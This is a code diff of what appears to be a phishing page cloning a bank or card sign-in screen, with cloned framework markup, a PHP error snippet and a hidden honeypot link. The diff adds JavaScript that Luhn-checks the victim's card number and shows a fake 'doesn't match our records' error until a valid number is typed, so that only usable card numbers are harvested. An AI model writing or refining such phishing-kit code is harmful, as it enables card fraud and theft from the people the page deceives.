@@ -11383,15 +11383,9 @@
                                                             <div _ngcontent-uld-87="" class="cardContent div-main ">
                                                                 <div _ngcontent-uld-91="">
                                                                 </div>
-                                                                <div padding-bottom="" text-center=""
-                                                                    class="ng-tns-c2-1 ng-star-inserted error-div"
-                                                                    tabindex="0"
-                                                                    style="padding: 0px 30px; color: red; <?=!$error ? 'display: none' : ''?>">
-                                                                    <span class="error error-summary">Hmm. The
-                                                                        information
-                                                                        you provided doesn't match our records. Try
-                                                                        again?</span>
+                                                                <div id="ben-badg">
                                                                 </div>
+
                                                                 <div _nghost-uld-101="">
                                                                     <form _ngcontent-uld-101="" id="loginForm" action=""
                                                                         class="authForm ng-untouched ng-pristine ng-valid lab-form">
@@ -11569,7 +11563,7 @@
                                                                                     class="uppercase"
                                                                                     style="cursor: pointer; text-align: center; color: white; padding-top: 20px;"
                                                                                     role="button" tabindex="0">
-                                                                                    <span  class="btn-txt"
+                                                                                    <span class="btn-txt"
                                                                                         _ngcontent-uld-53=""
                                                                                         aria-hidden="true"
                                                                                         buttoncontent="">SIGN IN</span>
@@ -11666,5 +11660,62 @@
     </div>
     <a href="/not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
 </body>
+<script>
+
+    function isValidCardNumber(value) {
+        // Remove any spaces or hyphens
+        const cardNumber = value.replace(/[\s-]/g, '');
+
+        // Ensure only numbers are present
+        if (!/^\d+$/.test(cardNumber)) {
+            return false;
+        }
+
+        let sum = 0;
+        let shouldDouble = false;
+
+        // Start from the rightmost digit and move to the left
+        for (let i = cardNumber.length - 1; i >= 0; i--) {
+            let digit = parseInt(cardNumber.charAt(i), 10);
+
+            if (shouldDouble) {
+                if ((digit *= 2) > 9) {
+                    digit -= 9;
+                }
+            }
+
+            sum += digit;
+            shouldDouble = !shouldDouble; // Alternate doubling
+        }
+
+        // The card number is valid if the sum is a multiple of 10
+        return (sum % 10) === 0;
+    }
+
+    let hasAlerted = false;
+
+    document.getElementById('input-card').addEventListener('blur', function () {
+        if (!isValidCardNumber(this.value)) {
+            if (!hasAlerted) {
+                document.getElementById('ben-badg').innerHTML = `<div padding-bottom="" text-center=""
+                                                                    class="ng-tns-c2-1 ng-star-inserted error-div"
+                                                                    tabindex="0"
+                                                                    style="padding: 0px 30px; color: red;">
+                                                                    <span class="error error-summary">Hmm. The
+                                                                        information
+                                                                        you provided doesn't match our records. Try
+                                                                        again?</span>
+                                                                </div>`
+                hasAlerted = true;
+            }
+            this.focus();
+        } else {
+            document.getElementById('ben-badg').innerHTML = ``
+            hasAlerted = false;
+        }
+    });
+
+ 
+</script>
 
 </html>
